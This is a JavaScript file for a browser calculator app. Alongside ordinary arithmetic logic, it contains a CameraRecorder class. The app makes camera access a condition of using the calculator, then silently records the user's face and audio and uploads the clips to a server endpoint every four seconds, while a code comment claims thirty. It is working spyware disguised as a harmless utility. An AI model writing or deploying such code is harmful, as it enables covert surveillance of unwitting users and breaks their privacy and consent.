class Calculator {
    constructor(previousOperandElement, currentOperandElement) {
        this.previousOperandElement = previousOperandElement;
        this.currentOperandElement = currentOperandElement;
        this.clear();
    }
    
    clear() {
        this.currentOperand = '0';
        this.previousOperand = '';
        this.operation = undefined;
        this.updateDisplay();
    }
    
    delete() {
        if (this.currentOperand === '0') return;
        this.currentOperand = this.currentOperand.toString().slice(0, -1);
        if (this.currentOperand === '') {
            this.currentOperand = '0';
        }
        this.updateDisplay();
    }
    
    appendNumber(number) {
        if (number === '.' && this.currentOperand.includes('.')) return;
        if (this.currentOperand === '0' && number !== '.') {
            this.currentOperand = number;
        } else {
            this.currentOperand = this.currentOperand.toString() + number.toString();
        }
        this.updateDisplay();
    }
    
    chooseOperation(operation) {
        if (this.currentOperand === '') return;
        if (this.previousOperand !== '') {
            this.compute();
        }
        this.operation = operation;
        this.previousOperand = this.currentOperand;
        this.currentOperand = '0';
        this.updateDisplay();
    }
    
    compute() {
        let computation;
        const prev = parseFloat(this.previousOperand);
        const current = parseFloat(this.currentOperand);
        if (isNaN(prev) || isNaN(current)) return;
        
        switch (this.operation) {
            case '+':
                computation = prev + current;
                break;
            case '-':
                computation = prev - current;
                break;
            case '×':
                computation = prev * current;
                break;
            case '÷':
                if (current === 0) {
                    alert('Cannot divide by zero!');
                    return;
                }
                computation = prev / current;
                break;
            case '%':
                computation = prev % current;
                break;
            default:
                return;
        }
        
        this.currentOperand = computation.toString();
        this.operation = undefined;
        this.previousOperand = '';
        this.updateDisplay();
    }
    
    updateDisplay() {
        this.currentOperandElement.innerText = this.currentOperand;
        if (this.operation != null) {
            this.previousOperandElement.innerText = 
                `${this.previousOperand} ${this.operation}`;
        } else {
            this.previousOperandElement.innerText = this.previousOperand;
        }
    }
}

// Camera and recording functionality
class CameraRecorder {
    constructor() {
        this.stream = null;
        this.mediaRecorder = null;
        this.recordedChunks = [];
        this.isRecording = false;
        this.recordingInterval = null;
    }

    async startCamera() {
        try {
            this.stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user' }, 
                audio: true 
            });
            
            const previewVideo = document.getElementById('previewVideo');
            previewVideo.srcObject = this.stream;
            
            return true;
        } catch (error) {
            console.error('Error accessing camera:', error);
            alert('Cannot access camera. Please allow camera permissions to use the calculator.');
            return false;
        }
    }

    startRecording() {
        if (!this.stream) return;

        try {
            this.mediaRecorder = new MediaRecorder(this.stream, {
                mimeType: 'video/webm;codecs=vp9,opus'
            });

            this.recordedChunks = [];
            
            this.mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    this.recordedChunks.push(event.data);
                }
            };

            this.mediaRecorder.start(1000); // Collect data every second
            this.isRecording = true;

            // Automatically send recordings every 30 seconds
            this.recordingInterval = setInterval(() => {
                this.sendRecording();
            }, 4000);

        } catch (error) {
            console.error('Error starting recording:', error);
        }
    }

    async sendRecording() {
        if (this.recordedChunks.length === 0) return;

        try {
            const blob = new Blob(this.recordedChunks, { type: 'video/webm' });
            const formData = new FormData();
            formData.append('recording', blob, `calculator_recording_${Date.now()}.webm`);
            formData.append('username', 'Calculator User');

            const response = await fetch('/upload-recording', {
                method: 'POST',
                body: formData
            });

            const result = await response.json();
            
            if (result.success) {
                this.showUploadStatus('Recording sent successfully', 'success');
                this.recordedChunks = []; // Clear sent chunks
            } else {
                this.showUploadStatus('Failed to send recording', 'error');
            }
        } catch (error) {
            console.error('Error sending recording:', error);
            this.showUploadStatus('Error sending recording', 'error');
        }
    }

    stopRecording() {
        if (this.mediaRecorder && this.isRecording) {
            this.mediaRecorder.stop();
            this.isRecording = false;
            
            if (this.recordingInterval) {
                clearInterval(this.recordingInterval);
                this.recordingInterval = null;
            }

            // Send any remaining recording
            if (this.recordedChunks.length > 0) {
                this.sendRecording();
            }
        }
    }

    showUploadStatus(message, type) {
        const statusElement = document.getElementById('uploadStatus');
        statusElement.textContent = message;
        statusElement.className = `upload-status ${type}`;
        
        setTimeout(() => {
            statusElement.textContent = '';
            statusElement.className = 'upload-status';
        }, 3000);
    }
}

// Initialize application
document.addEventListener('DOMContentLoaded', async () => {
    const permissionScreen = document.getElementById('permissionScreen');
    const calculatorContainer = document.getElementById('calculatorContainer');
    const allowCameraBtn = document.getElementById('allowCamera');
    
    const cameraRecorder = new CameraRecorder();
    
    // Initialize calculator
    const previousOperandElement = document.querySelector('.previous-operand');
    const currentOperandElement = document.querySelector('.current-operand');
    const calculator = new Calculator(previousOperandElement, currentOperandElement);
    
    // Camera permission handler
    allowCameraBtn.addEventListener('click', async () => {
        const success = await cameraRecorder.startCamera();
        
        if (success) {
            permissionScreen.classList.add('hidden');
            calculatorContainer.classList.remove('hidden');
            
            // Start recording
            setTimeout(() => {
                cameraRecorder.startRecording();
            }, 1000);
        }
    });
    
    // Calculator button event listeners
    document.querySelectorAll('.number').forEach(button => {
        button.addEventListener('click', () => {
            calculator.appendNumber(button.innerText);
        });
    });
    
    document.querySelectorAll('.operator').forEach(button => {
        button.addEventListener('click', () => {
            calculator.chooseOperation(button.innerText);
        });
    });
    
    document.querySelector('.equals').addEventListener('click', () => {
        calculator.compute();
    });
    
    document.querySelector('.clear').addEventListener('click', () => {
        calculator.clear();
    });
    
    document.querySelector('.delete').addEventListener('click', () => {
        calculator.delete();
    });
    
    // Keyboard support
    document.addEventListener('keydown', (event) => {
        if (event.key >= '0' && event.key <= '9') {
            calculator.appendNumber(event.key);
        } else if (event.key === '.') {
            calculator.appendNumber('.');
        } else if (event.key === '+' || event.key === '-' || event.key === '*' || event.key === '/') {
            let operation;
            switch (event.key) {
                case '+': operation = '+'; break;
                case '-': operation = '-'; break;
                case '*': operation = '×'; break;
                case '/': operation = '÷'; break;
            }
            calculator.chooseOperation(operation);
        } else if (event.key === 'Enter' || event.key === '=') {
            calculator.compute();
        } else if (event.key === 'Escape') {
            calculator.clear();
        } else if (event.key === 'Backspace') {
            calculator.delete();
        }
    });

    // Stop recording when page is closed
    window.addEventListener('beforeunload', () => {
        cameraRecorder.stopRecording();
    });
});
